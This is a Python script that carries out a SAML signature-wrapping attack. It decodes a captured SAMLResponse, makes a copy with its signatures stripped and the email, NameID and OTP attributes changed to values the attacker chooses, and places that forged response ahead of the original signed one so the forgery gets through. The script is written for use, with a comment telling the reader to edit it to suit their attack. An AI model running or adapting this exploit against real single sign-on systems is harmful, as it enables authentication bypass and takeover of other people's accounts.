import base64
from lxml import etree
import sys
import urllib.parse

# Get the original SAMLResponse parameter value as a command line argument
urlde = urllib.parse.unquote(sys.argv[1])
saml = base64.b64decode(urlde)

# origroot is the element tree that contains the original, signed response
origroot = etree.XML(saml)

# evilroot is the element tree that contains the edited response
evilroot = etree.XML(saml)

# Change the response and assertion ID so there are no duplicates
evilroot.set('ID', '_evilresp')
evilroot.xpath('//*[local-name(.)=\'Assertion\']')[0].set('ID', '_evilassertion')

# Remove all signature elements from evilroot
for i in evilroot.xpath('//*[local-name(.)=\'Signature\']'):
    i.getparent().remove(i)

# MAKE CHANGES HERE TO SUITE YOUR ATTACK.
evilroot.xpath('//*[local-name(.)=\'Attribute\' and @Name=\'account_manager_otp\']')[0][0].text = 'new_otp_value'
evilroot.xpath('//*[local-name(.)=\'Attribute\' and @Name=\'Email\']')[0][0].text = 'newemail@example.com'
evilroot.xpath('//*[local-name(.)=\'NameID\']')[0].text = 'newemail@example.com'

# Serialize the XML trees back to strings
origsaml = etree.tostring(origroot, encoding='utf-8')
evilsaml = etree.tostring(evilroot, encoding='utf-8')

# Create the new SAMLResponse with the evilroot at the beginning and the original after that 
newsaml = base64.b64encode(evilsaml + origsaml).decode('utf-8')

print('New parameter value with injected response:')
print(urllib.parse.quote(newsaml))
